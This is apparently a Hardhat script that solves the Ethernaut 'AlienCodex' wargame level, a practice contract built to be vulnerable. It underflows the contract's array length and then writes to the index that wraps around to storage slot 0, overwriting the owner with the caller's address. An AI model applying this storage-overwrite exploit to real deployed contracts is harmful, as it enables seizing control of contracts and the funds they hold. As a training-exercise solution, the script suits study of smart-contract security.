import { ethers } from "hardhat";
import { AlienCodex__factory } from "../typechain/factories/contracts//AlienCodex__factory";
import { BigNumber } from "ethers";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0x3169386bF0D9A3A0312A520F7D00Ff864d370170";
    let alienCodex = new AlienCodex__factory(signer).attach(instance_address);
    console.log(await alienCodex.owner());
    console.log(await provider.getStorageAt(instance_address, 0));


    let tx = await alienCodex.makeContact();
    await tx.wait();
    tx = await alienCodex.retract();
    await tx.wait();
    console.log(await provider.getStorageAt(instance_address, 1));
    
    let i = BigNumber.from(
        ethers.utils.keccak256(ethers.utils.zeroPad("0x01",32))
    );
    i = BigNumber.from("2").pow(256).sub(i);
    console.log(i);
    tx = await alienCodex.revise(i, ethers.utils.zeroPad(signer.address,32));
    await tx.wait();
    console.log(await alienCodex.owner());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
